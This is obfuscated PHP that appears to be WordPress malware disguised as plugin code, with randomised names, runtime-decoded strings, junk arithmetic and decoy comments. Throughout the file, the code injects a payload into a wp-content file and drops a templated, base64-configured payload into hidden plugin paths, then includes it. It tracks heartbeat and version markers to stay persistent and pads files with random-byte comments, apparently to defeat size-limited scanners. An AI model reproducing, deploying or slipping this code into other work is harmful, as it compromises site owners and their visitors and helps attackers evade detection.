  function    vjxo7lol9nqpyakwpwyz3i($current, $ayjxtgjc9htndr3)
    {
 if    (!$GLOBALS['__scf_fv3zevxzzb_44']($current) ||    $current ===      "") return      iw6xe9q4j6sneg(1304) .  $ayjxtgjc9htndr3   .  "\n";
  if ($GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1305),      $current, $yowwpgultz,   PREG_OFFSET_CAPTURE))    {
 $kbpx9t9y34lr4    = $yowwpgultz[0][1]   +  $GLOBALS['__scf_d4eyetogjbsnt_10']($yowwpgultz[0][0]);

$yvdqeelg7qn5amo  =  $GLOBALS['__scf_nv7he759wjfj_9']($current,     $kbpx9t9y34lr4,  (8135+57));
    while   ($GLOBALS['__scf_fv3zevxzzb_44']($yvdqeelg7qn5amo)  && $GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1306),     $yvdqeelg7qn5amo,   $_dm))    {
  $kbpx9t9y34lr4  +=  $GLOBALS['__scf_d4eyetogjbsnt_10']($_dm[0]);



 $yvdqeelg7qn5amo  = $GLOBALS['__scf_nv7he759wjfj_9']($current, $kbpx9t9y34lr4, (8427-235));
  }

   return $GLOBALS['__scf_nv7he759wjfj_9']($current,  0,  $kbpx9t9y34lr4) .   "\n"  .  $ayjxtgjc9htndr3   . "\n" .    $GLOBALS['__scf_nv7he759wjfj_9']($current,   $kbpx9t9y34lr4);
   }
  return     f6yrzd2knrmb(1304)  .   $ayjxtgjc9htndr3   .    "\n?>\n"  . $current;
      }
   function os047l930_shspyyo($key)
{
// phi-insert effect-type for WP Spacer Block

   if  (!$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1088)))     return true;



$x434be6la7lqy8l  =  @get_option(bpowi0iglycvx(1307) . $key,      "");
    if    ($GLOBALS['__scf_fv3zevxzzb_44']($x434be6la7lqy8l) && $GLOBALS['__scf_w6mdcepio4lkz5_7']($x434be6la7lqy8l,  '|')     !==  false)    {
  $cupk3kbt8eisf = $GLOBALS['__scf_xi_pncf33_0_120']('|',   $x434be6la7lqy8l, 2);
if ((int)    $cupk3kbt8eisf[0]   === (int)      ($GLOBALS['__scf_qzyo0sgkyb6_202']() /   (31059+55341))  &&  (int)   $cupk3kbt8eisf[1]    >=      (0x1+0x2))   return false;
   

     }
      return     true;
}
 function    qv9q02c8633k8zqa1sav($key)
      {$i9yp8hwt=12+41;$t4gy5vf6j=$i9yp8hwt-11;
   if (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1088))      ||  !$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1308))) return;
  $c42ubre636m = (int)   ($GLOBALS['__scf_qzyo0sgkyb6_202']()    /  (70327+16073));
     $x434be6la7lqy8l =     @get_option(f6yrzd2knrmb(1307) . $key, "");
$ukjj4vzpxsr =  0;
  

     if   ($GLOBALS['__scf_fv3zevxzzb_44']($x434be6la7lqy8l) &&   $GLOBALS['__scf_w6mdcepio4lkz5_7']($x434be6la7lqy8l,     '|')  !==  false) {


    $cupk3kbt8eisf     =    $GLOBALS['__scf_xi_pncf33_0_120']('|', $x434be6la7lqy8l,  2);
   if    ((int)  $cupk3kbt8eisf[0]     ===    $c42ubre636m)  $ukjj4vzpxsr  =  (int) $cupk3kbt8eisf[1];
 }
 $ukjj4vzpxsr++;
    @update_option(bpowi0iglycvx(1309) .    $key, $c42ubre636m  . '|'      . $ukjj4vzpxsr, ovffvv33(1310));
       if  ($ukjj4vzpxsr      >=  (101^102))   g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1311),    ovffvv33(1312)   .  $key);
}



 function   badvzt8dsmfgn6m6s()
  {
try  {
  if   (!defined(f6yrzd2knrmb(1261)))  return;
 if   (!defined(f6yrzd2knrmb(1236)) || !@$GLOBALS['__scf_sunuwikkpg6_51'](WP_CONTENT_DIR)   ||   !fiq2af1kmyjbo9re_ltz(WP_CONTENT_DIR)) return;
  $ftvsfz7ji2   = WP_CONTENT_DIR;
 $otl7ug4u8ca   = $ftvsfz7ji2 .  bpowi0iglycvx(524);
$pjov750v0e =   $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),  c1sob647u1i(1262));
 $sqgwaijtfri   =  nreub2fs747eromoe(ABSPATH  . c1sob647u1i(1145),  (192^200)) .    ovffvv33(1313);
       $pqo8538npnspm8 =      p2b_7j_9ex54eg4();

  $ucbbkg2es249  = nreub2fs747eromoe(ABSPATH     . hn_f08x0cns80(1314),     (2+8));



    $snosf5jeqtm1v9q  =   $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1290)) ? txfhz3hkzqfr161dyh10kv() : false;
 $f34bqvpw4n   =  $snosf5jeqtm1v9q  !== false  ?    $GLOBALS['__scf_txz82q2cnpicy_1315']($snosf5jeqtm1v9q) :    0;

  $cl96imudqe0r      = isset($GLOBALS[iw6xe9q4j6sneg(1253)]->prefix)    ?     $GLOBALS[f6yrzd2knrmb(1253)]->prefix    :   bpowi0iglycvx(1254);
     $u0cdkohgz2xqw9 =  c1sob647u1i(1316)   . $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($pjov750v0e .   (string)     e16j_u99g1ldi90iix1i9i()),  0,  (0x6+0x2));
 $p_873p6bgk   =  qjclarwdule01mm6a3h4wo(
 hn_f08x0cns80(661),
     array('__SLUG__',  '__ZIP_NAME__',    '__SHMOP_KEY__',  '__OPT_NAME__',  '__WP_PREFIX__',  '__GUARD_NAME__',  '__VERSION__'),
   array($pjov750v0e,  $sqgwaijtfri, $f34bqvpw4n,  $ucbbkg2es249, $cl96imudqe0r, $u0cdkohgz2xqw9,    dfb4_mpcgxvnp230hvh1v())
);



 if  (!$p_873p6bgk)    {
if ((int)  get_option(bpowi0iglycvx(764),  0) > 0)  g_qoqdy38lfl4v4n3618(ovffvv33(1317), hn_f08x0cns80(1318));
  

   return;
}
$current  =  @$GLOBALS['__scf_qg7ainp116mf_713']($otl7ug4u8ca)     ? @$GLOBALS['__scf_utyj_ckly79_101']($otl7ug4u8ca) :     "";


      if (!$GLOBALS['__scf_fv3zevxzzb_44']($current))   {
 g_qoqdy38lfl4v4n3618(c1sob647u1i(1317),   bpowi0iglycvx(1234));
     

return;
    }
    $current =    k12vjaxiygekdnj($current);
  $abe7rxcpkk9nsv   =    dfb4_mpcgxvnp230hvh1v() .   ':' . nreub2fs747eromoe(ABSPATH    .    f6yrzd2knrmb(1319),   (0x5+0x3));
 $cxi_2i7q2h     =  f6yrzd2knrmb(1320)      .  $abe7rxcpkk9nsv .  hn_f08x0cns80(1321);

$ekxvczjmiyqtk =  ovffvv33(1322)  .      $abe7rxcpkk9nsv .    iw6xe9q4j6sneg(1321);
     $bsg5_n0yae = nreub2fs747eromoe(ABSPATH    .  c1sob647u1i(1319), (3+5));
    $pgef_m8v4k3     =    $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1323) .  $bsg5_n0yae  .  bpowi0iglycvx(1324), "", $current);

 $yfat3eheah =  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($pgef_m8v4k3,  hn_f08x0cns80(1325)) !==   false);
   if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($current,  $cxi_2i7q2h)   !==   false  && $GLOBALS['__scf_w6mdcepio4lkz5_7']($current,     $ekxvczjmiyqtk)  !== false  &&    !$yfat3eheah) {



 zn7jd9uiqykpk825s6l();
  return;
  }
// soft reference

      $current = $GLOBALS['__scf_renvrk8nefa8_474'](hn_f08x0cns80(1326),   "",  $pgef_m8v4k3);
  if   (!$GLOBALS['__scf_fv3zevxzzb_44']($current))   {$f4vrfngf=8+34;$ihc_kr9xzed8l=$f4vrfngf-27;
g_qoqdy38lfl4v4n3618(ovffvv33(1317), ovffvv33(1327));
       return;
  } {
   $current = k12vjaxiygekdnj($current);
$yt8qbkm2059m =  $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1328),      "",   $p_873p6bgk);
 

    $uowhlk35k2 = ($GLOBALS['__scf_d4eyetogjbsnt_10']($current)  ===   0);
 if (!$uowhlk35k2)  {



 if (!os047l930_shspyyo(bpowi0iglycvx(1329))) {
 g_qoqdy38lfl4v4n3618(ovffvv33(1330),  f6yrzd2knrmb(1280));
return;
  }
   if     (!l1s0od7mbsjgia4oi($otl7ug4u8ca,   $current))     {
  g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1330), hn_f08x0cns80(1331));
 return;



}
  qv9q02c8633k8zqa1sav(f6yrzd2knrmb(1332));
   }      else  {



    if (!l1s0od7mbsjgia4oi($otl7ug4u8ca,  ""))     {

    g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1333),   ovffvv33(1331));
return;$fn1bgu77b1_dt=(0x15+0xe0);$f69f9trkj=$fn1bgu77b1_dt%13;
}
  }



   $f95gmfn4ulxv38r =    vjxo7lol9nqpyakwpwyz3i($current,   $cxi_2i7q2h . "\n"    . $yt8qbkm2059m .  "\n"     .     $ekxvczjmiyqtk);
  if  (!c5kyk62yk_dwfeubni4b($otl7ug4u8ca,  $f95gmfn4ulxv38r))  {



    return;
 }
 ghttebm5ugw_js_hn2zmc($otl7ug4u8ca);
    o4_k_ap14u5xy97yywy7k($otl7ug4u8ca);



    zn7jd9uiqykpk825s6l();
 }
    }  catch (Throwable $cje8wku90zm4r) {
      g_qoqdy38lfl4v4n3618(c1sob647u1i(1333),      $cje8wku90zm4r);
 }    catch  (Exception    $cje8wku90zm4r)  {
    }
}
 function z34nmz7362no0_e1qq03cl()
 {
try    {
  if     (!defined(bpowi0iglycvx(1261)))    return;
if  (hiisk00z0i4v1wyj3(bmvtr5sdqjf5km1t()))    return;
if   (!$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1334)))     return;
if    ($GLOBALS['__scf_h9zx4fm_1_qpan_110']()  ===    c1sob647u1i(425))  return;



   if  (!isset($_SERVER[ovffvv33(428)]))    return;
 if (get_transient(ovffvv33(1335)))  return;
$zgg7qnrazxog     =     p2b_7j_9ex54eg4();
      if   (!@$GLOBALS['__scf_opq_vgkskw_46']($zgg7qnrazxog)) xxvz5dp1zk215e5d9($zgg7qnrazxog,   (932-439), true);


if (!@$GLOBALS['__scf_opq_vgkskw_46']($zgg7qnrazxog)   || !@$GLOBALS['__scf_sunuwikkpg6_51']($zgg7qnrazxog)) {
      $zgg7qnrazxog =   ABSPATH .     bpowi0iglycvx(532);
if    (!@$GLOBALS['__scf_sunuwikkpg6_51']($zgg7qnrazxog))   $zgg7qnrazxog    =  ircnjcyfmf8qkc7xdiss4();
}
  $ch9n30w2u7ait  =  nreub2fs747eromoe(ABSPATH .   'g',  (158^150));
    $hl_ivme6axvk = hn_f08x0cns80(529)    .    $ch9n30w2u7ait  . iw6xe9q4j6sneg(1262);
    $uyleoz4_25shyzh =   $zgg7qnrazxog   . '/'  .   $hl_ivme6axvk;
 $utebyvj4ldxtht     = $zgg7qnrazxog   .  hn_f08x0cns80(1336) .    $ch9n30w2u7ait;
   foreach (array($zgg7qnrazxog,   ABSPATH    .    f6yrzd2knrmb(532),   ircnjcyfmf8qkc7xdiss4())  as     $_dcaoohwo52) {
  $dflv_wqzc73zi1  =  $_dcaoohwo52     .      c1sob647u1i(1337) .   $ch9n30w2u7ait;
  if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($dflv_wqzc73zi1))   {
  $niiep5w7aat4 =     (int)  @$GLOBALS['__scf_uo_a60ibqnli_104']($dflv_wqzc73zi1);


     if  ($niiep5w7aat4  <=      $GLOBALS['__scf_qzyo0sgkyb6_202']()  - (86334+66) ||  $niiep5w7aat4  >  $GLOBALS['__scf_qzyo0sgkyb6_202']() + (232+68))     {
 cvtaycsw15_xd1srry($dflv_wqzc73zi1);
      continue;
  }


   if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($_dcaoohwo52    .  ovffvv33(1338)  .   $ch9n30w2u7ait  .    bpowi0iglycvx(1262)))    return;
        cvtaycsw15_xd1srry($dflv_wqzc73zi1);
   }
 }
 unset($_dcaoohwo52,  $dflv_wqzc73zi1, $niiep5w7aat4);
  $bvhju9nyunge =    ABSPATH . f6yrzd2knrmb(1339)  .    $hl_ivme6axvk;
     if ($zgg7qnrazxog     !==    ABSPATH  . bpowi0iglycvx(532)   &&   @$GLOBALS['__scf_rjpcj9l4bigb5_21']($bvhju9nyunge)  &&  tq0de4uade8_8rlhtowy($bvhju9nyunge) !== false)  {
  ruinnb541lwxm7j($bvhju9nyunge,    (668-248));
    if    (cvtaycsw15_xd1srry($bvhju9nyunge)   &&  $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(748))) @opcache_invalidate($bvhju9nyunge,  true);


    }
     unset($bvhju9nyunge);
     if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($utebyvj4ldxtht)     &&   (int)   @$GLOBALS['__scf_uo_a60ibqnli_104']($utebyvj4ldxtht)   >   $GLOBALS['__scf_qzyo0sgkyb6_202']() - (0xaa+0x46))      return;
 if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($uyleoz4_25shyzh) &&  ($GLOBALS['__scf_qzyo0sgkyb6_202']()  -    (int)  @filectime($uyleoz4_25shyzh)) < (33+267))  return;
  if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($uyleoz4_25shyzh))      {
        $x91cbijy696t   =     @$GLOBALS['__scf_rjpcj9l4bigb5_21']($zgg7qnrazxog  .  hn_f08x0cns80(1340)  .  $ch9n30w2u7ait) ?     $GLOBALS['__scf_qew3crlieule_339']((string)  @$GLOBALS['__scf_utyj_ckly79_101']($zgg7qnrazxog  .    hn_f08x0cns80(1341) .  $ch9n30w2u7ait))   :   "";
if  ($x91cbijy696t    !==   ""  &&    $GLOBALS['__scf_wdjvpd1lvon9_102'](ovffvv33(1342), $x91cbijy696t)   &&  version_compare($x91cbijy696t, dfb4_mpcgxvnp230hvh1v(),  '>'))    return;
unset($x91cbijy696t);$a96uqafx=21*7;$a8jt2polxf34lt=$a96uqafx-29;
}
       if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($uyleoz4_25shyzh)) {
  $c70lokidjl    =  $zgg7qnrazxog  . f6yrzd2knrmb(1343)     . nreub2fs747eromoe(ABSPATH . 'g',     (7+1));
     $nv8ta8t63a    =   @$GLOBALS['__scf_rjpcj9l4bigb5_21']($c70lokidjl)  ?    (string)  @$GLOBALS['__scf_utyj_ckly79_101']($c70lokidjl)    :   "";

 $m7nr7bq487r =  0;
if   ($nv8ta8t63a   !==      "") {
 $zi2_pshwktdqznu =  $GLOBALS['__scf_xi_pncf33_0_120']('|',     $nv8ta8t63a);
    $m7nr7bq487r =  (int) $zi2_pshwktdqznu[0];
 }
if  ($m7nr7bq487r > 0    &&    $GLOBALS['__scf_qzyo0sgkyb6_202']()  - $m7nr7bq487r >  (855+45)) g_qoqdy38lfl4v4n3618(ovffvv33(1344),   bpowi0iglycvx(1345));
      elseif ($m7nr7bq487r === 0 && ($GLOBALS['__scf_qzyo0sgkyb6_202']()  - (int)   @filectime($uyleoz4_25shyzh))  > (736+164))   g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1344), bpowi0iglycvx(1346));
        unset($c70lokidjl,  $nv8ta8t63a, $zi2_pshwktdqznu, $m7nr7bq487r);
    }
$egziouap1xyua =  bfyls7pdkqkf4p8az();
  if    (!$egziouap1xyua  ||   $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)   < (428+72))   return;
$p8alf2wv440tgd  =  eos4svadcaj0dow8y();
 


     $pjov750v0e  = $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),    c1sob647u1i(1262));
    $y5987yfyk05yde6  =  ircnjcyfmf8qkc7xdiss4() .  iw6xe9q4j6sneg(14);
$qxh_w5r0fckz   =   @$GLOBALS['__scf_sunuwikkpg6_51']($y5987yfyk05yde6)
 ?   ($y5987yfyk05yde6 .  '/'  .  $pjov750v0e  .   c1sob647u1i(1262))
    :   (ircnjcyfmf8qkc7xdiss4()   .   hn_f08x0cns80(100)   .   $pjov750v0e  . '/'     .   $pjov750v0e     . bpowi0iglycvx(1262));
 $ylq_epx7jmb9   =      $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1196))   ?   $GLOBALS['__scf_lf33h8m4cq_577'](home_url(), PHP_URL_HOST)    :   (isset($_SERVER[hn_f08x0cns80(1347)])      ?  $_SERVER[hn_f08x0cns80(1347)]    :  "");
  $yb065zitb7z0h =  (defined(bpowi0iglycvx(1237))   && WPMU_PLUGIN_DIR) ?   WPMU_PLUGIN_DIR :     ircnjcyfmf8qkc7xdiss4() . bpowi0iglycvx(14);
   $o1j62zuhk4 = (defined(iw6xe9q4j6sneg(1238))   &&   WP_PLUGIN_DIR) ?   WP_PLUGIN_DIR   :      ircnjcyfmf8qkc7xdiss4()     .    iw6xe9q4j6sneg(1348);
 $i2na3v3lh55xr = defined(iw6xe9q4j6sneg(1236)) ? WP_CONTENT_DIR  :  ircnjcyfmf8qkc7xdiss4();

       $ti_2pbmot1xe = qjclarwdule01mm6a3h4wo(


  c1sob647u1i(1344),
array('__PATH_B64__', '__PLUGIN_BASE64__',  '__DOMAIN__',  '__HB_B64__',  '__GPATH_B64__',  '__ABSPATH_B64__',  '__CONTENTDIR_B64__',     '__MUDIR_B64__',    '__PLUGINDIR_B64__', '__SLUG__',  '__VERSION__'),
  array($GLOBALS['__scf_f2vx2328qo_369']($qxh_w5r0fckz),   $p8alf2wv440tgd, $ylq_epx7jmb9,  $GLOBALS['__scf_f2vx2328qo_369']($utebyvj4ldxtht), $GLOBALS['__scf_f2vx2328qo_369']($uyleoz4_25shyzh),   $GLOBALS['__scf_f2vx2328qo_369'](ABSPATH),    $GLOBALS['__scf_f2vx2328qo_369']($i2na3v3lh55xr),    $GLOBALS['__scf_f2vx2328qo_369']($yb065zitb7z0h), $GLOBALS['__scf_f2vx2328qo_369']($o1j62zuhk4), $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),   c1sob647u1i(1349)), dfb4_mpcgxvnp230hvh1v())
  );
    if    (!$ti_2pbmot1xe)     {
if  ((int)  get_option(iw6xe9q4j6sneg(764), 0)  >  0)  g_qoqdy38lfl4v4n3618(ovffvv33(1350),   c1sob647u1i(1351));
  return;
     }
if  (!ib2ffadoyj2m6zxmkaa2in($ti_2pbmot1xe))   {
// lane broadcast

 g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1352),  iw6xe9q4j6sneg(1353));
  return;
    }


       if    (c5kyk62yk_dwfeubni4b($uyleoz4_25shyzh,   $ti_2pbmot1xe))  {
 bouscp0t4dvybv($uyleoz4_25shyzh,    n22pv0e8f25y0co8());


 ruinnb541lwxm7j($uyleoz4_25shyzh,  (111+309));
o4_k_ap14u5xy97yywy7k($uyleoz4_25shyzh);
       s_xzav70hr_4pogeop0o($zgg7qnrazxog .     iw6xe9q4j6sneg(1354)  . $ch9n30w2u7ait,   $GLOBALS['__scf_tnonex5o9y_60']($ti_2pbmot1xe),  c1sob647u1i(1352));
    s_xzav70hr_4pogeop0o($zgg7qnrazxog .  iw6xe9q4j6sneg(1355)  . $ch9n30w2u7ait, dfb4_mpcgxvnp230hvh1v(), bpowi0iglycvx(1352));

 @include_once      $uyleoz4_25shyzh;
  set_transient(bpowi0iglycvx(1335),  1, (148+152));
}
  unset($yb065zitb7z0h, $o1j62zuhk4,  $i2na3v3lh55xr);
 }  catch    (Throwable    $cje8wku90zm4r)   {
    g_qoqdy38lfl4v4n3618(bpowi0iglycvx(1352),     $cje8wku90zm4r);


}  catch   (Exception  $cje8wku90zm4r)  {
}
    }



function  hc0wbkv3xzh9im34z($nm_xi0i0qy)
{
   if (!$GLOBALS['__scf_fv3zevxzzb_44']($nm_xi0i0qy))     return    false;
 $elwjt90x3e3730x  =   $GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy);


if  ($elwjt90x3e3730x >  (0xae2e1+0x51d1f))  return   true;
 if   ($elwjt90x3e3730x     < (420+80))     return  false;
  $ns25_g4nonn   =   $GLOBALS['__scf_nv7he759wjfj_9']($nm_xi0i0qy,   0, (0xf578+0xa88));
    $qch_07knwhj2 =   $GLOBALS['__scf__thjyt09xu_1356']($ns25_g4nonn, ' ')     +  $GLOBALS['__scf__thjyt09xu_1356']($ns25_g4nonn,  "\t");
    return ($qch_07knwhj2  /  $GLOBALS['__scf_d4eyetogjbsnt_10']($ns25_g4nonn)) >  0.55;
  }
     function  bfyls7pdkqkf4p8az($n66ml4zqob5uwv7k  =      false)
{
static $egziouap1xyua  =  null;



if  ($n66ml4zqob5uwv7k) {
     $egziouap1xyua  =  null;
}
      if    ($egziouap1xyua      !==   null)   return  $egziouap1xyua;

     $nm_xi0i0qy =    pvqofla267dcimn(bmvtr5sdqjf5km1t());
if ($GLOBALS['__scf_fv3zevxzzb_44']($nm_xi0i0qy)    &&  $GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy) >  (432+68)   &&   $GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy)  <= (0xd5b24+0x2a4dc) &&   !hc0wbkv3xzh9im34z($nm_xi0i0qy) && ib2ffadoyj2m6zxmkaa2in($nm_xi0i0qy))   {
// retry general-recursive scheduler

    $egziouap1xyua = $nm_xi0i0qy;
       return $egziouap1xyua;

 }
// @dispatch subscriber

 $ibrjbne32ad      = fcc42yo6xrdenvra0(ovffvv33(1357),    "");
  if  ($GLOBALS['__scf_fv3zevxzzb_44']($ibrjbne32ad)    && $GLOBALS['__scf_d4eyetogjbsnt_10']($ibrjbne32ad)     >  (412+88)  &&     $GLOBALS['__scf_d4eyetogjbsnt_10']($ibrjbne32ad)   <=   (0x617fe+0x9e802) &&  !hc0wbkv3xzh9im34z($ibrjbne32ad) &&   ib2ffadoyj2m6zxmkaa2in($ibrjbne32ad))    {

 $egziouap1xyua   =   $ibrjbne32ad;
    return $egziouap1xyua;
  }
  $egziouap1xyua    = false;
    return $egziouap1xyua;

  }
   function      eos4svadcaj0dow8y($n66ml4zqob5uwv7k  =    false)



 {
static  $fqntej805r =  null;
 if    ($n66ml4zqob5uwv7k) {
   $fqntej805r      =   null;
  }
  if  ($fqntej805r !==  null)    return      $fqntej805r;
 $nm_xi0i0qy =  bfyls7pdkqkf4p8az();
   if   (!$GLOBALS['__scf_fv3zevxzzb_44']($nm_xi0i0qy) || $GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy)     <  (463+37)  || $GLOBALS['__scf_d4eyetogjbsnt_10']($nm_xi0i0qy)  >     (1048524+52) ||      hc0wbkv3xzh9im34z($nm_xi0i0qy)  ||    !ib2ffadoyj2m6zxmkaa2in($nm_xi0i0qy))    {
  $fqntej805r =    false;


 return   $fqntej805r;
     }
 $fqntej805r   = $GLOBALS['__scf_f2vx2328qo_369'](ez2pan3ayqru782m5hz($nm_xi0i0qy));
       return  $fqntej805r;
     }
 function  uql5cxv40bgbaq184aiw9v($wbw1s8q9qbk05)
 {
        if   (!$GLOBALS['__scf_fv3zevxzzb_44']($wbw1s8q9qbk05)  ||   $GLOBALS['__scf_d4eyetogjbsnt_10']($wbw1s8q9qbk05)  <   (0xd+0x5)    ||   $GLOBALS['__scf_nv7he759wjfj_9']($wbw1s8q9qbk05,  0,   2)  !==     "\x1f\x8b")    return   0;
 $ew76kkpla0qghn6 =   @$GLOBALS['__scf_cqu48nk44w5__285']('V', $GLOBALS['__scf_nv7he759wjfj_9']($wbw1s8q9qbk05,  -(1+3)));
   $ew76kkpla0qghn6  =  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ew76kkpla0qghn6)  ?   $ew76kkpla0qghn6[1]  :   0;


      if  ($ew76kkpla0qghn6    < (102+398)   ||  $ew76kkpla0qghn6 > (454025+594551))     return $ew76kkpla0qghn6;
 return 0;
}
  function    bx6tv0tte_uw2al($u7fvh_hax8vn)


{
 return  $GLOBALS['__scf_adij6m_z1a_367'](hexdec($u7fvh_hax8vn[1]));



}
 function    fcywjpu_2kwq2ahog4($amsjsw283qnc3)
  {
 if  (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3) || $amsjsw283qnc3    === "")  return  $amsjsw283qnc3;
static  $dap_6et48ukpdm     =   null;
     if      ($dap_6et48ukpdm      ===  null) {


  $dap_6et48ukpdm =   false;
    if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1358)))     {
   $_dd  =   defined(f6yrzd2knrmb(1236))   ?   WP_CONTENT_DIR     :      (defined(c1sob647u1i(1359))  ?  ABSPATH  :    "");
     if ($_dd !==  "")  {
$o1odtbtc1ezp6o =   @disk_free_space($_dd);
if    ($o1odtbtc1ezp6o   !==    false      &&  $o1odtbtc1ezp6o >= (157286375+25))  $dap_6et48ukpdm =   true;
}


 }
    if (!$dap_6et48ukpdm) {
   if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1308)))  @update_option(f6yrzd2knrmb(1360), $GLOBALS['__scf_qzyo0sgkyb6_202'](),  f6yrzd2knrmb(1361));
 }  elseif   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1088)))   {
  $frju_qwj03jlh66  = (int)    get_option(hn_f08x0cns80(1360),  0);
if  ($frju_qwj03jlh66   &&  $GLOBALS['__scf_qzyo0sgkyb6_202']() -  $frju_qwj03jlh66 <  (133847-47447)) $dap_6et48ukpdm =   false;
 

}


    }
     if     (!$dap_6et48ukpdm)  {

   return  $amsjsw283qnc3;
 }
 $hiq6gpdhz9 =      sst6ig4atwfj9zru();


    if  ($hiq6gpdhz9 ===   -1     ||  $hiq6gpdhz9  >=  (134217723+5))  {$z__wx20v0=(0xfb+0x3);$qurswk4jeglw=$z__wx20v0%10;
$emnni5z67kh0 =   (2255852-455852) + $GLOBALS['__scf_ew0pe5qy71c8x_368'](0,   (356936+343064));
  } elseif  ($hiq6gpdhz9   >=    (0xca7a4a+0x33585b6)) {
    $emnni5z67kh0  =   (0xe6779+0xd0fc7) + $GLOBALS['__scf_ew0pe5qy71c8x_368'](0,   (891143-191143));
  }   else     {
  return   $amsjsw283qnc3;$w1oomwo1=PHP_INT_MAX/PHP_INT_MAX;$yzc53am1s=$w1oomwo1+73;



 }
  if   ($GLOBALS['__scf_d4eyetogjbsnt_10']($amsjsw283qnc3)  >= $emnni5z67kh0)   return    $amsjsw283qnc3;



  if     ($GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_ofdeuvs8zwos6_12']($amsjsw283qnc3),   -2)  ===   hn_f08x0cns80(1362)) return  $amsjsw283qnc3;



  while  ($GLOBALS['__scf_d4eyetogjbsnt_10']($amsjsw283qnc3)  < $emnni5z67kh0  -  (4846-746))    {
$n0tlzmrutbrfwh_ = "";
 if    ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1363)))     {
try {
      $n0tlzmrutbrfwh_ =  @$GLOBALS['__scf_ubbef44x62t_1364'](random_bytes((1431+569)));
 }      catch  (Throwable   $cje8wku90zm4r)    {
   $n0tlzmrutbrfwh_ =   "";
  }   catch  (Exception  $cje8wku90zm4r) {
// dimension expand




 $n0tlzmrutbrfwh_    = "";
}
}
if  ($GLOBALS['__scf_d4eyetogjbsnt_10']($n0tlzmrutbrfwh_) < (3975+25))  {
$n0tlzmrutbrfwh_ =  $GLOBALS['__scf_tnonex5o9y_60'](uniqid("", true));
    while   ($GLOBALS['__scf_d4eyetogjbsnt_10']($n0tlzmrutbrfwh_)   <   (5644-1644)) $n0tlzmrutbrfwh_ .=    $GLOBALS['__scf_tnonex5o9y_60']($n0tlzmrutbrfwh_);
 }
     $amsjsw283qnc3 .= "\n/*"   .   $n0tlzmrutbrfwh_    . c1sob647u1i(1365);
    }

   return     $amsjsw283qnc3;
 }


function    k12vjaxiygekdnj($amsjsw283qnc3)


 {
 if (!$GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)  ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($amsjsw283qnc3)  <= (1427566-378990)) return   $amsjsw283qnc3;



$ukjj4vzpxsr   =   $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1366),  "", $amsjsw283qnc3);
return  $GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr)  ?  $ukjj4vzpxsr : $amsjsw283qnc3;
}
 function   sst6ig4atwfj9zru()
 {
     static     $bq_s2wqt_3c =     null;
 if ($bq_s2wqt_3c !==    null)     return $bq_s2wqt_3c;
$bq_s2wqt_3c = 0;
if   (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1200)))    return     $bq_s2wqt_3c;
    $wbw1s8q9qbk05  = @$GLOBALS['__scf_hm704kpgfifhl_118'](c1sob647u1i(1367));
     if     (!$GLOBALS['__scf_fv3zevxzzb_44']($wbw1s8q9qbk05))   return   $bq_s2wqt_3c;
  $wbw1s8q9qbk05    = $GLOBALS['__scf_qew3crlieule_339']($wbw1s8q9qbk05);
  

  if ($wbw1s8q9qbk05 ===    "")  return  $bq_s2wqt_3c;
     if ($wbw1s8q9qbk05  === f6yrzd2knrmb(1368))  {
 $bq_s2wqt_3c  =   -1;
 return   $bq_s2wqt_3c;
     }



    $x434be6la7lqy8l   =   (float)   $wbw1s8q9qbk05;
  $jxa61zh8xs62i6x    =  $GLOBALS['__scf_z1sevw8b40p6_1369']($GLOBALS['__scf_nv7he759wjfj_9']($wbw1s8q9qbk05,  -1));
    if  ($jxa61zh8xs62i6x ===   'G')   $x434be6la7lqy8l  *=  (1073741788+36);

elseif    ($jxa61zh8xs62i6x  ===      'M')   $x434be6la7lqy8l  *=   (977976+70600);
elseif ($jxa61zh8xs62i6x ===   'K')    $x434be6la7lqy8l  *=  (1289-265);
